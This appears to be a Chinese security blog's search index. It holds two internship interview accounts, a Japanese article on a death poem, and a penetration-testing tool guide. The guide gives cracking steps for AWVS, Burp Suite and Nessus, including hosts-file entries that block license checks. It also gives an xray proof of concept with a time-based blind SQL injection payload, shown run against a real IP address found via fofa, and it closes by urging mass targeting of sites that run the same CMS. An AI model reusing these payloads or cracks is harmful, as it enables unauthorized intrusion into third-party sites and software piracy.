第一个xss我说完后他问了一句“就这么点内容吗”的时候我就知道这个面试G了。我暗示他我草我编不出来了快点到下一个问题早点结束早点退吧，但面试官还在一直拷打，问了一个富文本情况下怎么防护xss，我尼玛这不是我前几天刚看到的吗，但是我忘了，我直接坦白我忘了。他说你不要说忘了，让我根据场景发散思路，猜一下该怎么去防护。我尼玛这言下之意不就是说我前面的东西都是背的吗，这下是真的被揭底裤揭麻了。我发呆30秒，说不知道。。。我都不知道怎么度过这段时间的。 然后是文件上传。我每说完一段话，面试官都要从我的话里提取关键词追问。说后缀绕过就问怎么绕过，说中间件解析就问有哪些中间件解析漏洞，说完了我都忘了怎么问的了。按道理说是很基础很常规的东西我尼玛怎么之前都没去了解过呢。麻了。 然后是csrf和SQL注入。csrf之前我说xss的时候提到过一嘴，等于是之前就把话说完了，那我现在又要编怎么编得出来。。。我说可以用来伪造修改信息、刷帖子热度。他问就这么点利用方式吗。哈哈我不知道。。。SQL注入我稍微了解一点点，但是前面被拷打头晕了，说话都有点乱了，一会说原理一会说分类一会说危害。。。又问了怎么修复。我直接说我没修复过不太了解，就草草过了。没想到更尼玛一个重量级ssrf。不说了，这东西我压根没了解过。一句话编不出来，结巴一分钟，面试官看不下去了直接过了\n30-40分钟 面试官早看出猫腻了知道了简历那些东西还有自我介绍都是编的，直接问我自我介绍说不是熟悉owasp吗怎么答得跟屎一样。哈哈我的乖乖。。。问了个稍微简单点的问题怎么去做渗透测试。我尼玛人都傻了听不懂问题让他再说一遍。然后就是信息搜集、打点、fuzz、有哪些洞，怎么用，逻辑漏洞。我把我知道的全说出来了。结果又被问了一句“你不是做过渗透测试吗怎么就这些内容。。”。哈哈我都想笑了。我和面试官都笑嘻了。又问了下语言。问了c++ python写过什么项目，我把毕生所有的项目都搬上去，密码学大作业aes文件加解密、网安课设mini-wireshark、自己写的社工密码生成和b站视频下载。说完了面试官都没问，估计觉得太弱智了都懒得问细节了。我说b站。。的时候他还接嘴问是爬虫？我说哈哈没那么屌，就是调用接口下个视频而已。。绷不住了。\n40-50分钟 开始闲聊了。期间问了我两次给我xxx方面打分我打几分。我都说不及格，三四十分，哈哈懂的都懂面试官都懒得评价了，略施小计绕过评价环节，让我自己拷打自己。咦？这都有自我拷打的啊？又问了网宿干了多久，为什么要走，我说没走。。在等着找暑假实习呢，他说他们公司主要是对公司内部做渗透测试。聊了会我的学习xxxxx，说我基础太松了让我去学一学基础。哈哈终于要结束了吗，被你吗拷打五十分钟。。。反问了一下有几个岗位，我后面还有个哥们要面，他估计比我强，帮他探探路，结果只要三个。我寻思厦门+甲方双BUFF，那不就铁铁的G了吗。把这种职位扔给厦大爷和ctf佬吧。我只想快点退出会议。。。\n总结 被拷打五十分钟，这辈子没受这么大羞辱。退出会议发现还有gpt的痕迹，没想到被拷打晕了都忘了看了。回到桌面，看到360北京总部的渗透测试offer，才发觉我就是你妈一个小丑。怪不得没房补还低薪，也不摸摸自己的牛牛掂量掂量自己配拿正式的360渗透测试offer吗。。分出来一个牛马岗施舍一下我这双非废物，好让我有个简历镀金的机会，已经是周鸿祎这炒作狗最大的仁慈了。。我还挑三拣四的，撒泡尿照照自己什么屌样就清楚了。。。唉也怪我，废物面什么试啊，去考研算了。。。照着网课嗯看，王道嗯刷，轻松上分哦。哈哈。唉这几天在网宿尽是你吗报告文档和售前的资料搜集。真给自己干成销售了啊。有点想润了。感觉不如天天在寝室一觉睡到11点。。舒服，再不玩来不及了我只能说。。。唉还是先搞搞基础，把基础原理这些看了，打一打靶场。草你妈我真得骂一骂这些傻逼营销号，天天拿他吗十几二十年前的原理来凑字数，我草泥马看完一点收获没有，能不能有点现代的东西草你妈的。。。唉，把谷歌设为默认引擎了。再会！\n","permalink":"http://3lizabeth.fun/posts/articles/gbit_2405_exp/","summary":"最拷打的一集：甲方 厦门吉比特 实习面经 虽然 vx 通知就说了时长约为一个小时，但是实际上面了十分钟我就觉得可以G了，没想到面试官尽职尽责，要把工作干","title":"厦门吉比特信息安全岗24年5月实习面经"},{"content":"渗透测试工具部署及使用简易指南 漏扫 - awvs 下载地址 1 2 3 4 5 6 7 8 9 下载链接1 - 版本23.7 (直接下) https://ddosi-my.sharepoint.com/personal/netsparker_ddosi_onmicrosoft_com/_layouts/15/onedrive.aspx?id=%2Fpersonal%2Fnetsparker%5Fddosi%5Fonmicrosoft%5Fcom%2FDocuments%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%2Fawvs%2Facunetix%5F23%2E7%5Fwww%2Eddosi%2Eorg%2Erar\u0026amp;parent=%2Fpersonal%2Fnetsparker%5Fddosi%5Fonmicrosoft%5Fcom%2FDocuments%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%2Fawvs\u0026amp;ga=1 破解详情 https://www.ddosi.org/awvs-23-7/ ------------------------------------------------------------------------------------------------------------ 下载链接2 - 版本24.3 (迅雷云盘) https://pan.xunlei.com/s/VNvBVv1uyTE_5Eic_MHTvrWoA1提取码：baw5 破解详情 https://zhuanlan.zhihu.com/p/691434997 破解安装 1 2 3 4 5 安装步骤： 1.正常安装acunetix.exe 、同意证书的安装 2.添加hosts文件，防止远程监测更新 3.将license_info.json和wa_data.dat移动到 [安装目录]\\Acunetix\\shared\\license\\ （如果安装时选择默认，则在C盘programData文件夹中，为隐藏文件夹）中，选中两者，右键属性，设置为只读 4.将.exe文件替换至[安装目录]\\Acunetix\\24.3.240322155 安装好后直接登录是会提示缺少license的\n先去C:\\Windows\\System32\\drivers\\etc\\hosts 添加内容。如果没权限可以先保存一份在桌面，然后用桌面的复制过来替换hosts即可\n1 2 3 4 5 6 7 8 9 10 11 把一下几行映射添加到hosts中 127.0.0.1 erp.acunetix.com 127.0.0.1 erp.acunetix.com. ::1 erp.acunetix.com ::1 erp.acunetix.com. 192.178.49.174 telemetry.invicti.com 192.178.49.174 telemetry.invicti.com. 2607:f8b0:402a:80a::200e telemetry.invicti.com 2607:f8b0:402a:80a::200e telemetry.invicti.com. 替换license\n替换exe\n然后重启一下服务\n访问localhost:3343即可\n进入profile即可更改为中文\n新建扫描 首先添加目标\n保存后选择扫描相关参数即可开始扫描\nsql注入自动化 - sqlmap 下载地址 1 2 3 4 5 github: https://github.com/sqlmapproject/sqlmap 需要python环境，python官网 https://www.python.org/downloads/ 从终端进入\n使用python命令启动（已配置好python环境） python sqlmap.py \u0026hellip;\u0026hellip; 即可\n使用 查看帮助 python sqlmap.py -h\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 基础使用 python sqlmap.py -u \u0026#34;URL\u0026#34; ----对一个url进行检测 附加参数 其他读取方式 -r\t----读取一个文本文件进行检测，可将burp中抓到的http包保存为txt文件，然后使用该命令读取。可以用*来标注注入点 -m\t----读取一个文本文件，其中含有多个站点，可批量进行检测 -x\t----从目标站点开始爬取所有的站点，并进行测试 --batch ----对于一些后续的测试产生的提示进行自动化选择 （推荐） --level (1-5) ----指定注入等级，越高则检测的注入类型越多、越广，但会增加耗时 --risk (1-3)\t----指定注入风险等级，越高越越可能对目标站点的数据库造成不可估量的影响，慎用 --time-sec\t----指定时间盲注成功的睡眠时间，单位秒，可根据网络状况来选择 --tamper=xxxx\t----自定义注入时使用的替换模板脚本文件，可以用来绕过waf，tamper文件夹有许多自带模板，也可以根据某网站过滤条件、字段自己编写tamper来绕过 --random-agent\t----随机agent头，减少被检测识别的可能性 --dbs: ----枚举数据库管理系统中的所有数据库名称 -D, --dbms: ----指定目标数据库管理系统类型 (MySQL, PostgreSQL, etc.)。 --technique: ----指定注入技术 (B: Boolean-based blind, T: Time-based blind, U: UNION query, S: Stacked queries, etc.) --current-db: ----获取当前数据库名称 --current-user: ----获取当前数据库用户名称 -T, --tables: ----列出指定数据库中的所有表名称 -C, --columns: ----列出指定表中的所有列名称 --dump: ----导出指定表中的数据 --dump-all: ----导出所有数据库表中的数据 跑个sqlilab, 这关正好是盲注，盲注好像要level3 以上才行，需要加\u0026ndash;level 4 或者5\n信息收集 - dirsearch ,jsfinder, urlfinder 目录遍历 js爬虫 url爬虫\n1 2 3 4 下载地址 https://github.com/maurosoria/dirsearch https://github.com/Threezh1/JSFinder https://github.com/pingc0y/URLFinder 三者功能略有重复，但也各有所异，原理也不相同\n都是 -u 指定url 然后开扫\n1 2 3 4 5 go build urlfinder命令 只放一个win x64的 可以在readme.md里查看其它系统 SET CGO_ENABLED=0 SET GOOS=windows SET GOARCH=amd64 go build -ldflags \u0026#34;-s -w\u0026#34; -o ./URLFinder-windows-amd64.exe 1 2 3 4 5 6 7 8 python dirsearch.py -u [url] dirsearch 指定状态码的指令 --include, -i 200-299,300-399,403 指的是只显示该状态码的结果，反之，--exclude, -e 就是不显示 python jsfinder.py -u [url] urlfinder是go编写的，build后使用exe运行 urlfinder.exe -u [url] 其他参数可用-h查询 漏扫 - Nessus docker部署 一步到位 docker上 部署一步到位！\nlicense问题 参考 https://github.com/elliot-bia/nessus\n关于登录密码\n该密文为凯撒加密，位移为7\nWindows部署 1 2 3 4 5 6 官网下载链接 https://www.tenable.com/downloads/nessus?loginAttempted=true 官网获取activation code https://www.tenable.com/products/nessus/nessus-essentials 用可用的邮箱来接码，如果不想用自己的邮箱，可以用临时邮箱：https://temp-mail.org/en/ ​\t先正常安装，路径随便选,一直下一步就行。注意需要放在空的文件夹里，最好新建一个Nessus文件夹\n安装好之后在安装目录里有Nessus web client，访问之。\n笨蛋chrome可能会阻止访问，访问chrome://flags/#allow-insecure-localhost,将这一栏设置为enable\n把对应的网站的security policies清除即可访问\n安装步骤 选择离线注册\n选择offline registration\n先以管理员身份打开cmd，然后cd到Nessus的目录下\n1 2 3 4 cd /d \u0026#34;X:\\Path\\To\\Nessus\u0026#34; 然后运行命令 nessuscli fetch --challenge 然后在刚刚点击offline registration后跳出的网页中，上面输入cmd命令得到的challenge code，下面输入邮箱得到的activation code，submit得到key\n把插件下载好，就先不要管。\n把key复制过来，完成破解\n再设置登录账号\n完成后等待initialization即可\n安装插件 把之前下载的 .tar.gz 文件复制到Nessus目录下\ncmd 执行命令 nessuscli.exe update all-2.0.tar.gz 即可\n去服务里面重启Nessus服务，再次访问Nessus页面，等待插件加载。就OK了\nok！\n抓包 - burpSuite 下载地址 1 2 3 4 5 6 7 8 9 10 11 吾爱破解：https://www.52pojie.cn/forum.php?mod=viewthread\u0026amp;tid=1544866\u0026amp;highlight=burpsuite 链接： 123网盘（不限速 需登录 免客户端 ） https://www.123pan.com/s/F2W5Vv-Rk7Vv.html 提取码:52pj 百度网盘链接： https://pan.baidu.com/s/1J_CUxLKqC0h3Ypg4sQV0_g 提取码：52pj 第一次打开burp需要先破解\n打开注册机BurpSuiteLoader1.jar\n破解 然后直接下一步\n再点击手动激活\n点击下一步，注册成功\n设置证书 （系统安装、浏览器安装） 从burp中导出证书\n选择DER格式，next\n选择保存路径，后缀为cer\n选择受信任的根证书颁发机构 安装\n浏览器导入证书\n同样的，导入至受信任的根证书颁发机构即可\n然后在本地，再双击安装证书到系统，步骤同上；\n还有另外一份证书，暂不知两份证书有何不同，但一块导入了总没问题。。\n开启burp代理，url输入http://burp并访问，即可下载证书。\n需要注意的是有的说法是，将der的证书从浏览器导入后，需要再从浏览器导出，导出格式设置为cer；然而重新安装导入这个cer的证书至系统与浏览器。\n都试试总没问题。。。\n配置代理 先查看burp的代理设置\n推荐使用web代理管理工具\n谷歌浏览器可以使用switchy Omega插件\n新增情景模式，按照burp的模式添加即可\n选择该情景，即可在burp上抓到包\n漏扫 - nuclei, xray 下载地址 1 2 3 4 5 6 7 https://github.com/projectdiscovery/nuclei https://github.com/chaitin/xray 还有个非官方的xray ui版 选择对应的版本即可 https://github.com/4ra1n/super-xray 注意，使用nuclei需要go环境，官网下载配置即可 两个工具都是直接安装release里的exe即可\n两个工具都使用其强大的poc库对页面进行漏扫，如果不指定poc，则会使用默认模板。\nnuclei 基本参数 1 2 3 4 5 6 7 官方文档 https://github.com/projectdiscovery/nuclei/blob/main/README_CN.md -u --url 扫描的页面url 多个目标用多个-u参数指定 -t --templates 指定poc 最好先用-validate检验一下poc模板的可用性 模板记得放 C:\\Users\\用户名\\nuclei-templates 目录中，然后用 /yourdir/yourpoc来指定即可 -o 指定输出 等等 可用 -h 查阅更多指令 xray 基本使用 官方文档： [https://docs.xray.cool]\n使用基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描\n1 xray webscan --basic-crawler http://example.com --html-output vuln.html 使用 HTTP 代理进行被动扫描 （指哪打哪，代理访问的每一个页面都被监听且自动化扫描）\n1 xray webscan --listen 127.0.0.1:7777 --html-output proxy.html 设置浏览器 http 代理为 http://127.0.0.1:7777，就可以自动分析代理流量并扫描。\n只扫描单个 url，不使用爬虫\n1 xray webscan --url http://example.com/?a=b --html-output single-url.html 手动指定本次运行的插件\n默认情况下，将会启用所有内置插件，可以使用下列命令指定本次扫描启用的插件。\n1 2 xray webscan --plugins cmd-injection,sqldet --url http://example.com xray webscan --plugins cmd-injection,sqldet --listen 127.0.0.1:7777 指定插件输出\n可以指定将本次扫描的漏洞信息输出到某个文件中:\n1 2 xray webscan --url http://example.com/?a=b \\ --text-output result.txt --json-output result.json --html-output report.html 使用xray用自行编写的poc对网站进行扫描 以下举例，对fofa找到的一个真实的存在已知时间盲注漏洞的cms的登陆界面 进行xray扫描\n首先收集漏洞信息，然后编写xray使用的poc [https://poc.xray.cool/] 有些poc之间的模板并不通用，比如xray编写的poc并不一定能在nuclei上运行（可能是我配置有什么问题，但是我nuclei跑不了给xray编写的poc）\n编写界面大致如下，根据实际情况，在其中一个规则中添加http头和body，然后设置好响应状态码、响应头的输出、其他响应条件之类的，来判定漏洞标志。\npoc编写好之后，最好在xray目录下的config.yaml最开始那里 添加代理 proxy，给burp端口挂上，然后方便xray发包的时候用burp查看包信息来调试检查。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 name: poc-yaml-cms transport: http rules: r0: request: method: POST path: /api/user/login follow_redirects: false headers: Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6 User-Agent: \u0026gt;- Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 body: \u0026gt;- captcha=\u0026amp;password=21232f297a57a5a743894a0e4a801fc3\u0026amp;username=admin\u0026#39;and(select*from(select+sleep(0))a)=\u0026#39; expression: response.status == 200 output: r0latency: response.latency r1: request: method: POST path: /api/user/login follow_redirects: false headers: Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6 User-Agent: \u0026gt;- Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 body: \u0026gt;- captcha=\u0026amp;password=21232f297a57a5a743894a0e4a801fc3\u0026amp;username=admin\u0026#39;and(select*from(select+sleep(3))a)=\u0026#39; expression: response.latency - r0latency \u0026gt;= 2800 expression: r0() \u0026amp;\u0026amp; r1() detail: author: 3lizabeth links: - hqu3lizabeth.top 这个简单的cms的时间盲注poc，按照上面的模板填好后，保存为.yaml文件就能直接使用了。这里的yaml检测时间盲注的方法是用response.lantency。用两个规则，一个规则正常发包，获取大致的响应时间，然后另一个规则发送一个sleep(3)的包，两者相减，大致判断响应延迟是否在3秒左右，如是，则认为存在该cms的时间盲注漏洞\n使用xray扫描\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 L:\\Hack Tools\\web\\multiple scanners\\Xray\u0026gt;xray.exe ws -url \u0026#34;https://106.55.100.76\u0026#34; --poc C:\\Users\\Lovecraft\\Desktop\\cms-time.yaml --html-output ./output.html ____ ___.________. ____. _____.___. \\ \\/ /\\_ __ \\ / _ \\ \\__ | | \\ / | _ _/ / /_\\ \\ / | | / \\ | | \\/ | \\ \\____ | \\___/\\ \\ |____| /\\____|_ / / _____/ \\_/ \\_/ \\_/ \\/ Version: 1.9.11/eb0c331d/COMMUNITY [INFO] 2024-05-08 10:20:47 [default:entry.go:226] Loading config file from config.yaml Enabled plugins: [phantasm] [INFO] 2024-05-08 10:20:48 [phantasm:phantasm.go:114] found local poc C:\\Users\\Lovecraft\\Desktop\\cms-time.yaml [INFO] 2024-05-08 10:20:48 [phantasm:phantasm.go:185] 1 pocs have been loaded (debug level will show more details) [INFO] 2024-05-08 10:20:48 [default:dispatcher.go:444] processing GET https://106.55.100.76 [Vuln: phantasm] Target \u0026#34;https://106.55.100.76\u0026#34; VulnType \u0026#34;poc-yaml-cms/default\u0026#34; Author \u0026#34;3lizabeth\u0026#34; Links [\u0026#34;hqu3lizabeth.top\u0026#34;] [*] All pending requests have been scanned [*] scanned: 1, pending: 0, requestSent: 3, latency: 1059.00ms, failedRatio: 0.00% [INFO] 2024-05-08 10:20:52 [controller:dispatcher.go:573] controller released, task done 输出html报告\n然后就可以批量去搜集这种cms建站的网站，开始愉快的搬砖了~\n","permalink":"http://3lizabeth.fun/posts/study/tools_build/","summary":"渗透测试工具部署及使用简易指南 漏扫 - awvs 下载地址 1 2 3 4 5 6 7 8 9 下载链接1 - 版本23.7 (直接下) https://ddosi-my.sharepoint.com/personal/netsparker_ddosi_onmicrosoft_com/_layouts/15/onedrive.aspx?id=%2Fpersonal%2Fnetsparker%5Fddosi%5Fonmicrosoft%5Fcom%2FDocuments%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%2Fawvs%2Facunetix%5F23%2E7%5Fwww%2Eddosi%2Eorg%2Erar\u0026amp;parent=%2Fpersonal%2Fnetsparker%5Fddosi%5Fonmicrosoft%5Fcom%2FDocuments%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%2Fawvs\u0026amp;ga=1 破解详情 https://www.ddosi.org/awvs-23-7/ ------------------------------------------------------------------------------------------------------------ 下载链接2 - 版本24.3 (迅","title":"基础测试工具的安装、配置"},{"content":"二零二四年、四月二十五日、大雨、360渗透测试面经 下午下大暴雨，下了课赶紧溜进桑梓办公室草草准备面试，但是又准备不下去就fofa搬了会砖 五点半腾讯会议上边准时开始，面试官在工位上直接面试。每一个技术面HR都是百忙之中抽身来面试的，很少会有HR搞些谜语人问题来测试这测试那的。 HR几乎没问无聊的八股，趁着开头自我介绍的两分钟，他把简历过了一遍，然后几乎是照着简历一行一行地问。\n自我介绍完，就直奔项目和实习经历；我得老实说简历上面的经历我几乎都夸大地吹着写的。例如我第一点写道“搜集安全咨询、重大安全事件、爆出漏洞”，即便如此也就罢了，我还手贱写了“搜集重大漏洞POC”，HR直接问我近期的重大POC我写了哪些，一来就露馅了。草草说了个不痛不痒的cms Nday和一些老掉牙的漏洞。\nHR逐行拷打简历，又问道基线检查我是如何做的，用了哪些工具。我肯定不可能直接告诉他我只是负责校验脚本手动分级的文工，只是夸大着说了一些编写验证和加固脚本的经历应付过去。 下一个问题是渗透测试，问我有没有独立完成过渗透测试，我不敢说是，只好说是三四个实习生一起做然后打包报告；又问了挖过的一些比较负责的逻辑洞。我把这辈子能想到的最复杂的情形都枚举了一下，把一个平平无常的交易支付金额修改描述了一下，还描述得十分混乱，给人一种不是自己挖的感觉（确实是\n最要命的是我简历里面还提到了代码审计。直接被问到代码审计常用的工具。哈哈我的乖乖，代码审计不就是读代码吗，我会个锤子工具。我只好把我看开源cms的经历搬出来，就讲了看过一个博客类cms的项目，把里面的接口大致分析了一下，看了看有没有信息泄露和SQL注入漏洞之类的（其实本没看这么深，我甚至想在后端代码找前端JS加密的思路，笑嘻了 最后两个是docker搭建靶场，问了打过哪些靶场，常用的渗透测试工具，我脑子抽了连这些个工具都要说不出来了，胡乱说了两三个常见得批爆的工具，没有任何令人深刻的回答。。。 有趣的是，HR听到我七月才能入职的时候似乎有些惊喜。我想，这大抵是给他拒绝我一个绝佳的机会了，不必戳穿大三实习生脆弱的心灵，告诉他们时间不合适，便是最大的仁慈了。\n我还得再在网宿沉淀一下，多熟悉熟悉工具，和一些常见的渗透思路。把脑子打开。再扩大技术栈，学一学软件逆向，js逆向和小程序、安卓逆向吧。至少在六月之前，不要再想着暑假实习的事了。切勿好高骛远，务必脚踏实地。\n","permalink":"http://3lizabeth.fun/posts/articles/360_2404_exp/","summary":"二零二四年、四月二十五日、大雨、360渗透测试面经 下午下大暴雨，下了课赶紧溜进桑梓办公室草草准备面试，但是又准备不下去就fofa搬了会砖 五点","title":"北京360渗透测试24年4月实习面经"},{"content":"久坂玄瑞 最後の言葉 辞世の句 「辞世の句」とは、人が死の間際に詠む漢詩・和歌・俳句などのことです。自分の人生を振り返り、この世に最後に残す言葉として、様々な教訓を私たちに与えてくれるといって良いでしょう。\n古来より数えきれない辞世の句が残されてきましたが、今回は、久坂玄瑞の最後の言葉として、久坂玄瑞の辞世の句を紹介してみることにします。\n久坂玄瑞の最後 久坂玄瑞（くさかげんずい）は、1840年に長州萩藩（現在の山口県萩市）の藩医の子として生まれました。吉田松陰に師事し、高杉晋作とともに松下村塾の双璧と称された人物です。後に長州藩の尊王攘夷派の中心人物となった久坂玄瑞ですが、八月十八日の政変に続く禁門の変で幕府側諸藩の軍に敗れ、1864年8月20日、自刃することになります。享年24歳でした。\nそんな久坂玄瑞の辞世の句と言われているのが以下の句です。\n久坂玄瑞 辞世の句 「時鳥 血に鳴く声は 有明の 月より他に 知る人ぞなき」 時鳥とはホトトギスのことで、現代文に訳すなら「私の志は、夜明けに輝く月の他に誰も知らない」といったところでしょうか。\n「長州藩の若手の中では第一流の人物で天下の英才である」と吉田松陰が評した久坂玄瑞ですが、志半ばで斃れることになりました。死に際しては、周囲を振り返り「僕はこれまでだ、諸君は大いに勉めてくれよ」と話したと伝わっています。\nもし生きていればと後世の人が惜しむ英傑の一人だった言える久坂玄瑞ですが、死を前にした時、彼の頭の中を去来したのはなんだったのでしょう。この久坂玄瑞の最後の言葉である辞世の句は、皆さんの心にどう響きましたか？\n","permalink":"http://3lizabeth.fun/posts/articles/haiku1/","summary":"久坂玄瑞 最後の言葉 辞世の句 「辞世の句」とは、人が死の間際に詠む漢詩・和歌・俳句などのことです。自分の人生を振り返り、この世に最後に残す言葉と","title":"久坂玄瑞 最後の言葉〜辞世の句"},{"content":" ","permalink":"http://3lizabeth.fun/about/","summary":" ","title":""},{"content":"\r王爹的博客\r曾爹的博客\r","permalink":"http://3lizabeth.fun/links/","summary":"links","title":"🤝我厚米们"}]